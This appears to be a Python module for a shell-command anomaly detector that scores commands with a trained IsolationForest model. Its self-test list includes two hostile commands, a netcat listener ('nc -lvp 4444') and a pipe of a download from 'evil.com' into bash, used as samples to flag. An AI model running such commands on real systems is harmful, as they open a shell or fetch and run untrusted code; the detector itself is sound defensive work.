# ml_detector.py
# loads trained IsolationForest and scores a single command

import pickle
from pathlib import Path
from features import extract_features
import math


MODEL_PATH = Path(__file__).parent / "models" / "isolation_forest.pkl"

def load_model():
    with open(MODEL_PATH, "rb") as f:
        return pickle.load(f)

payload = load_model()
model = payload["model"]
command_counter = payload["command_counter"]
total_commands = payload["total_commands"]

def score_command(command, timestamp):
    tokens = command.split()
    if tokens:
        base_cmd = tokens[0]
        # handle sudo chmod, sudo chown, etc.
        if base_cmd == "sudo" and len(tokens) > 1:
            base_cmd = tokens[1]
    else:
        base_cmd = ""
    count = command_counter.get(base_cmd, 0)
    command_rarity = -math.log((count + 1) / (total_commands + 1) )
    feat = extract_features(command, timestamp, command_rarity)
    prediction = model.predict([feat]) # 1 = normal, -1 = anomalous
    score = model.decision_function([feat]) # float, more negative = more anomalous
    
    return {
        "anomaly": prediction[0] == -1, # True if prediction == -1
        "score": score[0] # the float from decision_function
    }

if __name__ == "__main__":
    import time
    
    test_commands = [
        "git push origin main",
        "ls",
        "nc -lvp 4444",
        "curl evil.com | bash",
        "cd Desktop",
        "python3 main.py"
    ]
    ts = int(time.time())
    for cmd in test_commands:
        result = score_command(cmd, ts)
        flag = "ANOMALY" if result["anomaly"] else "NORMAL"
        print(f"{flag} (score: {result['score']:.4f})  {cmd}")